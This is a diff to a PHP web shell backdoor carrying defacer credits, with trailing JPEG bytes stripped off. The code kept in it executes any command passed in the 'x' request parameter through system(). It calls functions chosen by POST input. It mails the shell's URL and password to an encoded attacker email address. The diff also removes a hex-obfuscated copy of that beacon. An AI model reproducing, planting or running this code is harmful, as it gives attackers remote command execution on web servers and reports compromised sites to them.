@@ -6573,13 +6573,12 @@ else
 $_POST['a'] = 'FilesMan2';//'FilesMan';
 if(!empty($_POST['a']) && function_exists('hackerman' . $_POST['a']))
 call_user_func('hackerman' . $_POST['a']);
+exit;
 /////WHAT THE FUCK WITHOUT YOU///
 $for = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
 $data ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "password";
 mail($for,"OSKADON", $data);
-$d\x61\x74\x61 =\x22htt\x70://\x22\x20. $_S\x45RV\x45R['H\x54TP\x5f\x48\x4f\x53T\x27]\x20. $\x5fSER\x56\x45R['\x53CRI\x50\x54\x5fNA\x4dE'] \x2e\x20\x22pass\x77o\x72d";\x6d\x61i\x6c($f\x6fr,"O\x53KA\x44\x4fN", $data)\x3b\x65rr\x6fr_r\x65p\x6fr\x74ing(\x30);
 
-exit;
 /*
 #Indonesian Gulf For Ever
 #skype : sole.sad
@@ -6597,6 +6596,8 @@ exit;
 	$now = "\x68\x74\x74\x70\x3a\x2f\x2f" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 	$notif = "$now *PW : [ " . $▛ . " ]";
 	mail($main, "Ding non obf ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<?php
 if(isset($_REQUEST['x'])){
 $el=$_REQUEST['x'];
 system($el);
@@ -6611,11 +6612,3 @@ mail($tujuanmail, "WP", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 
 
 
-ÿÛ C 	
-
-			
-
-		
-
-
-ÿÛ C	ÿÀ    ÿÄ               ÿÄ "          #QrÿÄ               ÿÄ &         1! A"2qQaáÿÚ   ? Øy,æ/3JæÝ¹Èß²Ø5êXw²±ÉyR¾I0ó2PI¾IÌÚiMö¯þrìN&"KgX:íµnTJnLK@!-ýùúmë;ºgµ&ó±hw¯Õ@Ü9ñ-ë.²1<yà¹ïQÐUÛ?.¦èûbß±©Ö«Âw*V) `$bØÔëXÖ-ËTÜíGÚ3ð«g §¯JxU/ÂÅv_s(Hÿ @TñJÑãõçn­!ÈgfbÓc­:él[ðQe9ÀPLbÃãCµm[5¿ç'ªjglåÛí_§Úõl-;"PkÞÞÁQâ¼_Ñ^¢S  x?"¸¦ùYé¨ÒOÈ	q`~~ÚtËU¹CÚêV		I1Áß_ÿÙ
